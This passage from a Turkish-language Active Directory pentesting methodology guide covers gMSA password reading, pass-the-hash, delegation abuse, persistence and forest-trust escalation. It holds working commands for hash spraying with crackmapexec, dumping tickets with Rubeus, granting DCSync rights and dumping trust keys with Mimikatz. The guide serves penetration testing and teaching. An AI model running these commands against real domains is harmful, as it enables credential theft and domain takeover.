Başarısız bir varsayılan/NTLM bind işlemi bu bulguyu **geçersiz kılmaz**: `-k` seçeneğiyle, DC'ye çözümlenen bir FQDN kullanarak ve KDC ile eşitlenmiş bir saatle test edin. Başarılı modül çalıştırmaları, aday listelerini ve edinilen ccaches dosyalarını `~/.nxc/modules/pre2k/` dizinine yazar.<sup>[[18]](#references)[[20]](#references)</sup>

Computer principal'ı ele geçirdikten sonra, iç içe grup üyeliklerini ve giden haklarını grafiğe dökün. Özellikle, bir gMSA'nın `msDS-GroupMSAMembership` güvenlik tanımlayıcısında adı geçen principal'lar `msDS-ManagedPassword` değerini okuyabilir. NetExec'in `--gmsa` çıktısı, izin verilen principal'ları gösterir ve kimlik doğrulaması yapan computer yetkiliyse mevcut NT hash'ini döndürür.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Ardından kurtarılan gMSA’yı diğer tüm kimlik bilgileri gibi değerlendirin: pass-the-hash denemeden önce yerel/etki alanı grup üyeliklerini, oturum açma haklarını, SPN’leri, delegation’ı ve erişilebilir hizmetleri inceleyin. ACL tabanlı bu alma yolu, KDS root key’in ele geçirilmesinden sonra yönetilen parolaları türeten [Golden gMSA/dMSA](golden-dmsa-gmsa.md) yönteminden farklıdır.<sup>[[20]](#references)</sup>

Bir bilgisayar principal’ı, diğer bilgisayar nesneleri veya gruplar üzerinde giden denetime de sahip olabilir. Böyle bir principal elde ettikten sonra iç içe üyeliklerini ve etkin ACL’lerini ayrı ayrı inceleyin: başka bir bilgisayar nesnesi üzerindeki yazma hakkı bir hesap değişikliğine olanak sağlayabilir; grup üyeliği hakları ise bir oturum açma rolüne yol açabilir. Aşamalı hesap bayrağı, öngörülebilir adlandırma kuralı veya tek başına bir `GenericWrite` bağlantısı, yolun tamamını kanıtlamaz.

Bir dosyada, paylaşımda veya yedekte bulunan `msDS-ManagedPassword` blob’unun okunabilir kopyası ayrı bir ifşa yoludur: LDAP okuma ACL’si başka bir yerde depolanan kopyayı koruyamaz. Veriyi yorumlamadan önce bunun yönetilen parola blob’u olduğunu doğrulayın ve bu durumu hem yetkili LDAP okumasından hem de KDS root key türetme işleminden ayırın.

### Kerberoast

Kerberoasting, kullanıcı hesaplarına bağlı hizmetler tarafından kullanılan **TGS ticket’larının** edinilmesini ve kullanıcı parolalarına dayalı şifrelemelerinin **çevrimdışı** kırılmasını içerir.

Bu konuda daha fazla bilgi:


{{#ref}}
kerberoast.md
{{#endref}}

### Uzak bağlantı (RDP, SSH, FTP, Win-RM vb.)

Bazı kimlik bilgileri elde ettikten sonra herhangi bir **makineye** erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için port taramalarınıza uygun olarak, farklı protokoller üzerinden birden fazla sunucuya bağlanmayı denemek amacıyla **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Normal bir etki alanı kullanıcısı olarak kimlik bilgilerini veya bir oturumu ele geçirdiyseniz ve etki alanındaki **herhangi bir makineye** erişebiliyorsanız, **yerel olarak yetkileri yükseltmenin ve kimlik bilgilerini toplamanın** yollarını arayın. Yerel yönetici ayrıcalıkları, bellekten (LSASS) ve yerel depolamadan (SAM) **diğer kullanıcıların hash’lerini dökmenize** olanak sağlayabilir.

Bu kitapta [**Windows’ta yerel yetki yükseltme**](../windows-local-privilege-escalation/index.html) hakkında kapsamlı bir sayfa ve bir [**kontrol listesi**](../checklist-windows-privilege-escalation.md) bulunuyor. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Geçerli Oturum Ticket’ları

Geçerli kullanıcının **beklenmedik kaynaklara erişim izni veren ticket’lara** sahip olması **pek olası değildir**, ancak şunları kontrol edebilirsiniz:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Domain credentials veya bir user session ile, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) konusunu yeniden ele alın: authenticated enumeration ve coercion teknikleri, unauthenticated reconnaissance sırasında erişilemeyen relay yollarını ortaya çıkarabilir.

### Bilgisayar Paylaşımlarında Creds Ara | SMB Shares

Artık bazı temel credentials’a sahip olduğunuza göre, **AD içinde paylaşılan** **ilginç dosyalar bulup bulamayacağınızı** kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz, ancak bu oldukça sıkıcı ve tekrarlayan bir iştir (özellikle kontrol etmeniz gereken yüzlerce belge bulursanız).

[**Kullanabileceğiniz araçları öğrenmek için bu bağlantıyı izleyin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds Çalma

Diğer **PC’lere veya paylaşımlara erişebiliyorsanız**, bir şekilde erişildiğinde **size karşı NTLM authentication’ı tetik**leyecek SCF dosyası gibi **dosyalar bırakabilir**, böylece crack etmek için **NTLM challenge’ı çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu güvenlik açığı, herhangi bir authenticated user’ın **domain controller’ı compromise etmesine** olanak tanıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Privileged credentials/session ile Active Directory’de privilege escalation

**Aşağıdaki teknikler için normal bir domain user yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel privileges/credentials gerekir.**

### Hash extraction

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relay’i de içeren [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) veya [yerel olarak privilege escalation](../windows-local-privilege-escalation/index.html) yöntemlerini kullanarak bir **local admin** hesabını **compromise** etmişsinizdir.\
Şimdi bellekteki ve yerel tüm hash’leri dump etme zamanı.\
[**Hash’leri elde etmenin farklı yolları için bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir user’ın hash’ini elde ettiğinizde**, bunu onu **impersonate etmek** için kullanabilirsiniz.\
Bu **hash’i kullanarak NTLM authentication gerçekleştirecek** bir **tool** kullanmanız gerekir. **Ya da** yeni bir **sessionlogon** oluşturup bu **hash’i** **LSASS** içine **inject** edebilirsiniz; böylece herhangi bir **NTLM authentication gerçekleştirildiğinde** bu **hash kullanılır.** Mimikatz’ın yaptığı, son seçenektir.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash yönteminin NTLM protokolü üzerinden kullanılmasına alternatif olarak, **user’ın NTLM hash’ini Kerberos ticket’ları istemek için kullanmayı** amaçlar. Bu nedenle, **NTLM protokolünün devre dışı bırakıldığı** ve authentication protokolü olarak yalnızca **Kerberos’a izin verilen** ağlarda özellikle **faydalı olabilir**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, kullanıcının parolasını veya hash değerlerini almak yerine **kullanıcının authentication ticket’ını çalar**. Ardından bu ticket, **kullanıcıyı impersonate etmek** ve bir ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim elde etmek için kullanılır.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Bir **local admin** hesabının **hash’ine** veya **parolasına** sahipseniz, bu bilgilerle diğer **PC’lerde yerel olarak login olmayı** deneyin.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Bunun oldukça **noisy** olduğunu ve **LAPS**'ın bunu **mitigate** edeceğini unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcının **MSSQL instance'larına erişim** ayrıcalıkları varsa, MSSQL host'u (SA olarak çalışıyorsa) üzerinde **komutlar çalıştırabilir**, NetNTLM **hash**'ini **çalabilir** veya hatta bir **relay attack** gerçekleştirebilir.\
Bir MSSQL instance'ı başka bir instance tarafından database link üzerinden trusted ise, bağlantılı database üzerinde ayrıcalıkları olan bir kullanıcı, **diğer instance'ta sorgu çalıştırmak için trust ilişkisinden yararlanabilir**. Bu trust ilişkileri zincirlenebilir ve sonunda kullanıcının komut çalıştırabileceği yanlış yapılandırılmış bir database'e ulaşabilir.\
**Database'ler arasındaki bağlantılar forest trust'ları boyunca da çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT varlık/dağıtım platformlarının kötüye kullanımı

Üçüncü taraf envanter ve dağıtım paketleri, genellikle kimlik bilgilerine ve code execution'a erişim sağlayan güçlü yollar sunar. Bkz.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğine sahip bir Computer nesnesi bulursanız ve bilgisayarda domain ayrıcalıklarına sahipseniz, bilgisayarda oturum açan tüm kullanıcıların TGT'lerini bellekten dump edebilirsiniz.\
Dolayısıyla, bir **Domain Admin bilgisayarda oturum açarsa**, TGT'sini dump edebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onu taklit edebilirsiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak compromise** bile edebilirsiniz (umarız bu bir DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir kullanıcı veya bilgisayar "Constrained Delegation" için yetkilendirilmişse, **bir bilgisayardaki belirli servislere erişmek için herhangi bir kullanıcıyı taklit edebilir**.\
Ardından bu kullanıcının/bilgisayarın **hash'ini ele geçirirseniz**, bazı servislere erişmek için **herhangi bir kullanıcıyı** (Domain Admin'ler dâhil) **taklit edebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Uzak bir bilgisayarın Active Directory nesnesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** code execution elde edilmesini sağlar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### İzinlerin/ACL'lerin kötüye kullanımı

Compromise edilmiş kullanıcı, bazı domain nesneleri üzerinde **yatay hareket etmenizi**/**ayrıcalıkları yükseltmenizi** sağlayabilecek **ilginç ayrıcalıklara** sahip olabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler servisinin kötüye kullanımı

Domain içinde **dinleme yapan bir Spool servisi** keşfetmek, **yeni kimlik bilgileri edinmek** ve **ayrıcalıkları yükseltmek** için bu servisin **kötüye kullanılmasını** sağlayabilir.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Üçüncü taraf oturumlarının kötüye kullanımı

**Başka kullanıcılar** **compromise edilmiş** makineye **erişirse**, **bellekten kimlik bilgileri toplamak** ve hatta onları taklit etmek için **process'lerine beacon inject etmek** mümkündür.\
Kullanıcılar genellikle sisteme RDP üzerinden erişir; bu nedenle burada üçüncü taraf RDP oturumlarına yönelik birkaç attack'ın nasıl gerçekleştirileceğini bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e katılmış bilgisayarlardaki **local Administrator parolasını** yönetmek için bir sistem sağlar; parola **rastgele**, benzersiz ve sık sık **değiştirilen** bir parola olur. Bu parolalar Active Directory'de saklanır ve erişimleri ACL'ler aracılığıyla yalnızca yetkili kullanıcılarla sınırlandırılır. Bu parolalara erişmek için yeterli ayrıcalıklara sahip olmak, diğer bilgisayarlara pivot etmeyi mümkün kılar.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromise edilmiş makineden **certificate toplamak**, ortam içinde ayrıcalıkları yükseltmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**Vulnerable template'ler** yapılandırılmışsa, ayrıcalıkları yükseltmek için bunları kötüye kullanmak mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Yüksek ayrıcalıklı hesapla Post-exploitation

### Domain kimlik bilgilerini dump etme

**Domain Admin** veya daha iyisi **Enterprise Admin** ayrıcalıkları elde ettiğinizde, **domain database'ini** (_ntds.dit_) **dump edebilirsiniz**.

[DCSync attack hakkında daha fazla bilgiye buradan ulaşabilirsiniz](dcsync.md).

[NTDS.dit dosyasının nasıl çalınacağı hakkında daha fazla bilgiye buradan ulaşabilirsiniz](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit` ile `SYSTEM` hive'ını içeren ve okunabilir durumdaki bir backup arşivi, içeriği çıkarılmadan önce bile açığa çıkmış directory materyali olarak değerlendirilmelidir. Eski bir parola hash'i, diğer nesne özniteliklerinin güvenli olduğu anlamına gelmez: `description` gibi alanlarda kimlik bilgileri veya operasyonel notlar bulunabilir. Önce arşivdeki üye adlarını inceleyin ve çıkarılan database içeriğini rutin enumeration çıktılarından uzak tutun.

### Persistence için Privesc

Daha önce ele alınan tekniklerin bazıları persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) saldırılarına açık hâle getirmek.

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Kullanıcıları [**ASREPRoast**](asreproast.md) saldırısına açık hale getirinેણ

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları ver

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**, belirli bir hizmet için **NTLM hash**'ini (örneğin, **PC hesabının hash**'ini) kullanarak **geçerli bir Ticket Granting Service (TGS) ticket** oluşturur. Bu yöntem, **hizmet ayrıcalıklarına erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**, saldırganın bir Active Directory (AD) ortamındaki **krbtgt hesabının NTLM hash**'ine erişim sağlamasını içerir. Bu hesap özeldir; çünkü AD ağında kimlik doğrulaması için gerekli olan tüm **Ticket Granting Ticket (TGT)**'leri imzalamak için kullanılır.

Saldırgan bu hash'i elde ettiğinde, seçtiği herhangi bir hesap için **TGT** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın golden ticket tespit mekanizmalarını atlayacak** şekilde oluşturulan golden ticket'lara benzer.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Bir hesabın sertifikalarına sahip olmak veya bunları talep edebilmek**, kullanıcı hesabında kalıcılık sağlamak için çok iyi bir yöntemdir (kullanıcı parolasını değiştirse bile):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Sertifikalar kullanarak etki alanında yüksek ayrıcalıklarla kalıcılık sağlamak da mümkündür:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** nesnesi, yetkisiz değişiklikleri önlemek için bu gruplara standart bir **Access Control List (ACL)** uygulayarak **ayrıcalıklı grupların** (Domain Admins ve Enterprise Admins gibi) güvenliğini sağlar. Ancak bu özellik istismar edilebilir; saldırgan AdminSDHolder'ın ACL'sini değiştirip normal bir kullanıcıya tam erişim verirse, bu kullanıcı tüm ayrıcalıklı gruplar üzerinde geniş kapsamlı denetim elde eder. Dolayısıyla koruma amacı taşıyan bu güvenlik önlemi, yakından izlenmediği takdirde istenmeyen erişime yol açabilir.

[**AdminDSHolder Group hakkında daha fazla bilgi burada.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** hesabı bulunur. Böyle bir makinede yönetici hakları elde edildiğinde, yerel Administrator hash'i **mimikatz** kullanılarak çıkarılabilir. Ardından, bu parolanın **kullanımını etkinleştirmek** için bir kayıt defteri değişikliği gerekir. Böylece yerel Administrator hesabına uzaktan erişim sağlanabilir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bir **kullanıcıya**, belirli etki alanı nesneleri üzerinde **özel izinler** **vererek** kullanıcının **ileride ayrıcalık yükseltmesi** yapmasını sağlayabilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor**'lar, bir **nesnenin** başka bir **nesne** üzerindeki **izinlerini** **saklamak** için kullanılır. Bir nesnenin **security descriptor**'ında **küçük bir değişiklik** yapabilirseniz, ayrıcalıklı bir grubun üyesi olmanız gerekmeden bu nesne üzerinde çok ilginç ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Kısa ömürlü principal/GPO/DNS kayıtları oluşturmak için `dynamicObject` yardımcı sınıfını `entryTTL`/`msDS-Entry-Time-To-Die` ile birlikte istismar edin. Bu nesneler tombstone bırakmadan kendilerini siler; LDAP kanıtlarını ortadan kaldırırken geride sahipsiz SID'ler, bozuk `gPLink` referansları veya önbelleğe alınmış DNS yanıtları bırakırlar (ör. AdminSDHolder ACE kirliliği ya da kötü amaçlı `gPCFileSysPath`/AD ile tümleşik DNS yönlendirmeleri).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Tüm etki alanı hesaplarına erişim sağlayan **evrensel bir parola** oluşturmak için bellekteki **LSASS**'ı değiştirin.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan **kimlik bilgilerini** **açık metin** olarak **yakalamak** amacıyla **kendi SSP**'nizi oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD'de **yeni bir Domain Controller** kaydeder ve belirtilen nesnelerin özniteliklerini (SIDHistory, SPN'ler...) **değişikliklere** ilişkin herhangi bir **log** bırakmadan **iletmek** için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış veriler kullanırsanız oldukça kötü logların oluşacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce **LAPS parolalarını okuyabilecek yeterli izniniz** varsa ayrıcalıklarınızı nasıl yükseltebileceğinizi ele almıştık. Ancak bu parolalar **kalıcılık sağlamak** için de kullanılabilir.\
Şuraya göz atın:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'u güvenlik sınırı olarak görür. Bu, **tek bir etki alanının ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **etki alanındaki** kullanıcının başka bir **etki alanındaki** kaynaklara erişmesini sağlayan bir güvenlik mekanizmasıdır. Temelde, iki etki alanının kimlik doğrulama sistemleri arasında bağlantı kurarak kimlik doğrulama doğrulamalarının sorunsuz biçimde aktarılmasını sağlar. Etki alanları bir trust oluşturduğunda, trust'ın bütünlüğü için kritik olan belirli **anahtarları** kendi **Domain Controller (DC)**'ları arasında paylaşır ve saklar.

Tipik bir senaryoda, bir kullanıcı **trusted domain** içindeki bir hizmete erişmek isterse önce kendi etki alanının DC'sinden **inter-realm TGT** olarak bilinen özel bir ticket talep etmelidir. Bu TGT, her iki etki alanının da üzerinde anlaştığı ortak bir **anahtarla** şifrelenir. Kullanıcı daha sonra bir hizmet ticket'ı (**TGS**) almak için bu TGT'yi **trusted domain'in DC'sine** sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla doğruladığında bir TGS verir ve kullanıcıya hizmete erişim izni tanır.

**Adımlar**:

1. **Domain 1**'deki bir **istemci bilgisayar**, **Domain Controller'ından (DC1)** bir **Ticket Granting Ticket (TGT)** talep etmek için **NTLM hash**'ini kullanarak süreci başlatır.
2. İstemcinin kimliği başarıyla doğrulanırsa DC1 yeni bir TGT verir.
3. İstemci daha sonra **Domain 2**'deki kaynaklara erişmek için gereken bir **inter-realm TGT**'yi DC1'den talep eder.
4. Inter-realm TGT, iki yönlü domain trust kapsamında DC1 ve DC2 arasında paylaşılan bir **trust key** ile şifrelenir.
5. İstemci inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi doğrular ve geçerliyse istemcinin erişmek istediği Domain 2 sunucusu için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak istemci, Domain 2'deki hizmete erişmek için bu TGS'yi sunucuya iletir. TGS, sunucunun hesap hash'i ile şifrelenmiştir.

### Different trusts

Bir trust'ın **tek yönlü veya iki yönlü olabileceğini** belirtmek önemlidir. İki yönlü seçeneklerde her iki etki alanı da birbirine güvenir; **tek yönlü** trust ilişkisinde ise etki alanlarından biri **trusted**, diğeri **trusting** olur. İkinci durumda, yalnızca trusted domain'den trusting domain içindeki kaynaklara erişebilirsiniz.

Domain A, Domain B'ye güveniyorsa A, trusting domain; B ise trusted domain'dir. Ayrıca **Domain A**'da bu bir **Outbound trust** olurken **Domain B**'de bir **Inbound trust** olur.

**Farklı trust ilişkileri**

- **Parent-Child Trusts**: Aynı forest içindeki yaygın bir yapılandırmadır. Child domain, parent domain'iyle otomatik olarak iki yönlü ve geçişli bir trust ilişkisi kurar. Bu, kimlik doğrulama isteklerinin parent ve child arasında sorunsuz biçimde aktarılabileceği anlamına gelir.
- **Cross-link Trusts**: "Shortcut trusts" olarak da bilinir ve yönlendirme süreçlerini hızlandırmak için child domain'ler arasında kurulur. Karmaşık forest'larda kimlik doğrulama yönlendirmeleri genellikle forest root'a kadar çıkıp ardından hedef etki alanına iner. Cross-link oluşturmak bu yolu kısaltır ve özellikle coğrafi olarak dağınık ortamlarda fayda sağlar.
- **External Trusts**: Farklı ve ilgisiz etki alanları arasında kurulur ve doğaları gereği geçişli değildir. [Microsoft'un belgelerine](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre external trust'lar, forest trust ile bağlantısı olmayan mevcut forest dışındaki bir etki alanındaki kaynaklara erişmek için kullanışlıdır. External trust'larda SID filtering güvenliği artırır.
- **Tree-root Trusts**: Forest root domain ile sonradan eklenen yeni bir tree root arasında otomatik olarak kurulur. Yaygın karşılaşılmasa da forest'a yeni etki alanı ağaçları eklemek için önemlidir; bu ağaçların kendilerine özgü etki alanı adlarını korumasını ve iki yönlü geçişliliği sağlar. Daha fazla bilgi için [Microsoft'un kılavuzuna](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) bakabilirsiniz.
- **Forest Trusts**: İki forest root domain arasında kurulan iki yönlü ve geçişli bir trust türüdür; güvenliği artırmak için SID filtering de uygular.
- **MIT Trusts**: Windows dışı, [RFC4120 uyumlu](https://tools.ietf.org/html/rfc4120) Kerberos etki alanlarıyla kurulur. MIT trust'lar daha özelleşmiştir ve Windows ekosistemi dışındaki Kerberos tabanlı sistemlerle entegrasyon gerektiren ortamlar için tasarlanmıştır.

#### **Trust ilişkilerindeki** diğer farklar

- Trust ilişkisi **geçişli** (A, B'ye güvenir; B, C'ye güvenir; o hâlde A, C'ye güvenir) veya **geçişsiz** olabilir.
- Trust ilişkisi **çift yönlü trust** (taraflar birbirine güvenir) veya **tek yönlü trust** (taraflardan yalnızca biri diğerine güvenir) olarak kurulabilir.

### Attack Path

1. Trust ilişkilerini **enumerate** edin.
2. Herhangi bir **security principal**'ın (kullanıcı/grup/bilgisayar) **diğer etki alanının** kaynaklarına erişimi olup olmadığını kontrol edin. Bu erişim ACE girdilerinden veya diğer etki alanının gruplarında yer almaktan kaynaklanabilir. **Etki alanları arasındaki ilişkileri** arayın (muhtemelen trust bu amaçla oluşturulmuştur).
   1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Etki alanları arasında **pivot** yapabilen **hesapları ele geçirin**.

Saldırganlar, üç temel mekanizma aracılığıyla başka bir etki alanındaki kaynaklara erişebilir:

- **Local Group Membership**: Principal'lar bir makinedeki yerel gruplara, örneğin sunucudaki “Administrators” grubuna eklenebilir ve böylece o makine üzerinde önemli ölçüde denetim elde edebilir.
- **Foreign Domain Group Membership**: Principal'lar yabancı etki alanındaki grupların üyesi de olabilir. Ancak bu yöntemin etkililiği trust'ın niteliğine ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar bir **ACL** içinde, özellikle de **DACL** içindeki **ACE**'lerde tanımlanarak belirli kaynaklara erişim elde edebilir. ACL, DACL ve ACE mekanizmaları hakkında daha fazla bilgi edinmek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı teknik rapor değerli bir kaynaktır.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Etki alanındaki yabancı security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** konumunu kontrol edebilirsiniz. Bunlar **harici bir etki alanından/forest'tan** gelen kullanıcı/gruplardır.

Bunu **Bloodhound**'da veya powerview kullanarak kontrol edebilirsiniz:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest ayrıcalık yükseltme

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Domain trust'larını listelemenin diğer yolları:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **2 güvenilir anahtar** vardır; biri _Child --> Parent_, diğeri _Parent_ --> _Child_ için.\
> Geçerli etki alanı tarafından kullanılan anahtarı şu komutla alabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection kullanarak trust ilişkisinden yararlanıp child/parent domain üzerinde Enterprise admin yetkilerine yükselin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Yazılabilir Configuration NC'yi Exploit Etme

Configuration Naming Context'in (NC) nasıl exploit edilebileceğini anlamak çok önemlidir. Configuration NC, Active Directory (AD) ortamlarındaki bir forest genelinde yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) çoğaltılır ve yazılabilir DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için bir DC'de, tercihen bir child DC'de **SYSTEM yetkilerine** sahip olmak gerekir.

**GPO'yu root DC sitesine bağlama**

Configuration NC'nin Sites container'ı, AD forest içindeki domain'e katılmış tüm bilgisayarların sitelerine ilişkin bilgileri içerir. Herhangi bir DC'de SYSTEM yetkileriyle çalışan saldırganlar GPO'ları root DC sitelerine bağlayabilir. Bu işlem, söz konusu sitelere uygulanan politikaları değiştirerek root domain'in ele geçirilmesine yol açabilir.

Ayrıntılı bilgi için [SID Filtering'i Atlatma](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırmasına göz atabilirsiniz.<sup>[[12]](#references)</sup>

**Forest'teki herhangi bir gMSA'yı ele geçirme**

Bir saldırı vektörü, domain içindeki ayrıcalıklı gMSA'ları hedef almayı içerir. gMSA parolalarını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC'de SYSTEM yetkileriyle KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA'nın parolalarını hesaplamak mümkündür.

Ayrıntılı analiz ve adım adım yönergeler için:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA saldırısı (BadSuccessor – migration attributes'tan yararlanma):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek harici araştırma: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema değişikliği saldırısı**

